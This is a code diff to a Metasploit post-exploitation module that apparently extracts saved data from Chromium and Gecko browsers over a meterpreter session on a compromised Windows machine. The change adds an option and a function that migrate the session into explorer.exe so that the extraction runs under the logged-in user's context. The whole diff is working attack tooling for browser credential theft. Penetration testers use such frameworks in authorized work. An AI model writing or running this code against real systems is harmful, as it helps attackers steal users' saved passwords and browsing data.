@@ -34,6 +34,7 @@ class MetasploitModule < Msf::Post
 
     register_options([
       OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data', false]),
+      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction', false])
     ])
   end
 
@@ -41,6 +42,10 @@ class MetasploitModule < Msf::Post
     if session.type != 'meterpreter'
       print_error('This module requires a meterpreter session.')
       return
+    end
+
+    if datastore['USER_MIGRATION']
+      migrate_to_explorer
     end
 
     user_profile = get_env('USERPROFILE')
@@ -57,6 +62,30 @@ class MetasploitModule < Msf::Post
 
     process_chromium_browsers(user_profile)
     process_gecko_browsers(user_profile)
+  end
+
+  def migrate_to_explorer
+    current_pid = session.sys.process.getpid
+    explorer_process = session.sys.process.get_processes.find { |p| p['name'].downcase == 'explorer.exe' }
+
+    if explorer_process
+      explorer_pid = explorer_process['pid']
+      if explorer_pid == current_pid
+        print_status("Already running in explorer.exe (PID: #{explorer_pid}). No need to migrate.")
+        return
+      end
+
+      print_status("Found explorer.exe running with PID: #{explorer_pid}. Attempting migration.")
+
+      begin
+        session.core.migrate(explorer_pid)
+        print_good("Successfully migrated to explorer.exe (PID: #{explorer_pid}).")
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_error("Failed to migrate to explorer.exe (PID: #{explorer_pid}). Error: #{e.message}")
+      end
+    else
+      print_error('explorer.exe process not found. Migration aborted.')
+    end
   end
 
   # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
